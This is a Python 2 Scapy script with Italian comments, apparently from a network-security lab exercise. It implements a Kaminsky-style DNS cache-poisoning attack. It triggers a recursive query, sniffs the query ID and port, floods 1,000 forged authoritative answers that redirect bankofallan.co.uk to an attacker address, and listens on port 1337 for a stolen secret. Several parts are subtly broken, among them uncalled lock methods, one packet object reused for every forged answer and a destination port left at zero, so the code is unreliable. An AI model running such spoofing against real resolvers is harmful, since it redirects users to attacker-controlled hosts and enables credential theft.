'''
FUORI CICLO:
        - il padre inizializza il treno di pacchetti

DENTRO IL CICLO:
        - 1 il padre manda la richiesta per badguy.ru
        - 2 il figlio sniffa la richiesta DNS ricorsiva e cattura Q_ID e PORT_UMBER
        - 3 il figlio prepara l'array di pacchetti risposta per la query a bankofallan.co.uk
        - 4 il padre fa la richiesta per bankofallan
        - 5 il figlio invia l'array di pacchetti ONE SHOT
        - 6 il padre controlla la risposta, se va male si rinizia
'''

from threading import Thread
import time
from random import randint
from scapy.layers.inet import *
from scapy.layers.dns import *
from scapy.all import *
from threading import *
# TODO VARIANTE CON SOLI 2 THREAD, USO DEI LOCK

DNS_SPOOF_IP = "10.0.0.1"
BAD_DNS_IP = "192.168.56.1"
VULN_DNS_IP = "192.168.56.101"
DST_PORT = 53

Q_ID = 0                # query ID globale
PORT_NUMBER = 0         # porta da catturare
GOAL = 0                # va a 1 se riesco nell'attacco
RESTART = 1             # settata a 1 dal bad_client se ottiene risposta 10.0.0.1, cioe' se no poisoning
ERRORI = 0              # condizione di uscita per failure
N_TRY = 1               # tentativi provati
L1 = Lock()   # lock
L2 = Lock()   #
PACKETS = []

class SecondThread(Thread):

        def __init__(self, val):
                Thread.__init__(self)
                self.val = val

        def run(self):
                if self.val == 0:                             # child crafter
                        sniffer_crafter()
                elif self.val == 1:                           # ascolto secret
                        server()

def sniffer_crafter():
        '''
        - sniffa la richiesta DNS ricorsiva e cattura Q_ID e PORT_UMBER
        - prepara l'array di pacchetti risposta per la query a bankofallan.co.uk
        - il figlio invia l'array di pacchetti ONE SHOT
        :return:
        '''
        global RESTART
        global Q_ID
        global PORT_NUMBER
        global L1
        global L2

        L1.acquire
        L2.acquire
        print "\t\t[LOCK]\tchild got locks"

        while GOAL == 0:
                if RESTART == 1:
                        RESTART = 0

                        L1.release()
                        print "\t\t[LOCK]\t il figlio ha lasciato L1"

                        # sniffo q_ID e port number
                        pkts = sniff(count=1, timeout=2,
                                     filter=("src host " + VULN_DNS_IP + " and dst host " + BAD_DNS_IP + " and dst port " + str(DST_PORT)),
                                     lfilter=lambda pkt: pkt.haslayer(DNS))
                        Q_ID = pkts[0].getlayer(DNS).id
                        PORT_NUMBER = pkts[0].getlayer(UDP).sport

                        # prepara l'array di pacchetti risposta per la query a bankofallan.co.uk
                        global PACKETS
                        for i in range(0, 1000):
                                PACKETS[i].getlayer(DNS).id = (Q_ID + i) % 65535

                        L2.release()
                        print "\t\t[LOCK]\t il figlio ha lasciato L2"

                        # invio pacchetti one shot
                        send(PACKETS)

                        L1.acquire()
                        print "\t\t[LOCK]\t il figlio ha preso L1"
                        L2.acquire()
                        print "\t\t[LOCK]\t il figlio ha preso L2"


def server():
        '''
        ascolta su porta 1337
        :return:
        '''
        filtro = "src host " + VULN_DNS_IP + " and dst host " + BAD_DNS_IP + " and dst port 1337"
        scrt_pkt = sniff(count=1, filter=filtro)
        print "[VICTORY] got secret!"
        scrt_pkt[0].show()

def father_job():
        '''
        - manda la richiesta per badguy.ru
        - fa la richiesta per bankofallan
        - controlla la risposta, se va male si rinizia
        :return:
        '''
        global N_TRY
        global RESTART
        global GOAL
        global L1
        global L2

        while (GOAL == 0):

                print ("\n\nTry # " + str(N_TRY))


                L1.acquire()
                print "\t\t[LOCK] il padre ha preso L1"

                # richiesta per badguy
                #time.sleep(1)
                send(IP(dst=VULN_DNS_IP) / UDP() / DNS(rd=1, qd=DNSQR(qname="badguy.ru")))

                L1.release()
                print "\t\t[LOCK] il padre ha lasciato L1"

                L2.acquire()
                print "\t\t[LOCK] il padre ha preso L2"

                response = sr1(IP(dst=VULN_DNS_IP) / UDP() / DNS(rd=1, qd=DNSQR(qname="bankofallan.co.uk")))
                print "[SENDER]         response: " + str(response[0].getlayer(DNS).an.rdata)

                L2.release()
                print "\t\t[LOCK] il padre ha lasciato L2"

                if response[0].getlayer(DNS).an.rdata == DNS_SPOOF_IP:
                        RESTART = 1
                        N_TRY = N_TRY + 1

                else:
                        GOAL = 1

                        server_thread.join()
                        child_thread.join()


############################ MAIN ###########################
# TODO start del thread in ascolto su 1337 prima degli altri

def master_job():
        '''
        - il bad client e i  flooders devono partire sulla stessa condizione (cioe' qID e PORT diversi da 0)
        :return:


        global ERRORI
        global GOAL
        global Q_ID
        global PORT_NUMBER
        global RESTART
        global N_TRY

        #listener_thread = FirstThread(name="listener", job=4, flood=None)
        #listener_thread.start()


        while GOAL == 0 and ERRORI < 3:
                print ('\n\n\nTry # ' + str(N_TRY))
                RESTART = 0

                # Creazione dei thread
                sniffer_thread = SecondThread(name="sniffer", job=0, flood=None)
                first_sender_thread = SecondThread(name="first sender", job=1, flood=None)
                sniffer_thread.start()
                first_sender_thread.start()
                sniffer_thread.join()
                first_sender_thread.join()

                print ('found qID: ' + str(hex(Q_ID)))
                print ('found port: ' + str(PORT_NUMBER))

                if (Q_ID == 0 or PORT_NUMBER == 0):
                        print '[MAIN] error on qID or port'
                        ERRORI = ERRORI + 1
                        continue

                bad_client_thread = SecondThread(name="bad client", job=2, flood=None)
                flooder_0 = SecondThread(name="flood0", job=3, flood=0)
                flooder_1 = SecondThread(name="flood1", job=3, flood=1)
                flooder_2 = SecondThread(name="flood2", job=3, flood=2)
                flooder_3 = SecondThread(name="flood3", job=3, flood=3)
                flooder_4 = SecondThread(name="flood4", job=3, flood=4)
                flooder_5 = SecondThread(name="flood5", job=3, flood=5)
                flooder_6 = SecondThread(name="flood6", job=3, flood=6)
                flooder_7 = SecondThread(name="flood7", job=3, flood=7)

                # TODO sinconia tra bad client e flooders
                bad_client_thread.start()
                flooder_0.start()
                flooder_1.start()
                flooder_2.start()
                flooder_3.start()
                flooder_4.start()
                flooder_5.start()
                flooder_6.start()
                flooder_7.start()

                bad_client_thread.join()
                flooder_0.join()
                flooder_1.join()
                flooder_2.join()
                flooder_3.join()
                flooder_4.join()
                flooder_5.join()
                flooder_6.join()
                flooder_7.join()

        if GOAL == 1:
                print "Goal reached."

        else:
                print "too many errors."


        #listener_thread.join()'''

### PADRE

# inizzializzazione treno pacchetti
pkt = IP(dst=VULN_DNS_IP, src=DNS_SPOOF_IP) / UDP(sport=53, dport=PORT_NUMBER) / \
        DNS(id= 0, qr=1L, opcode='QUERY', aa=1L, tc=0L, rd=1L, ra=1L, z=0L, rcode='ok',
            qdcount=1, ancount=1,
            nscount=0, arcount=0,
            qd=(DNSQR(qname='bankofallan.co.uk', qtype='NS', qclass='IN')),
            an=None,
            ns=(DNSRR(rrname='co.uk', type='NS', rclass='IN', ttl=60000, rdlen=24,
                      rdata='bankofallan.co.uk')),
            ar=(DNSRR(rrname='bankofallan.co.uk', type='A', rclass='IN', ttl=60000, rdlen=4,
                      rdata=BAD_DNS_IP)) /
               DNSRR(rrname='.', type=41, rclass=4096, ttl=32768, rdlen=0, rdata=''))

for i in range(0, 1000):
        PACKETS.append(pkt)



server_thread = SecondThread(val=1)
server_thread.start()

child_thread = SecondThread(val=0)
child_thread.start()

father_job()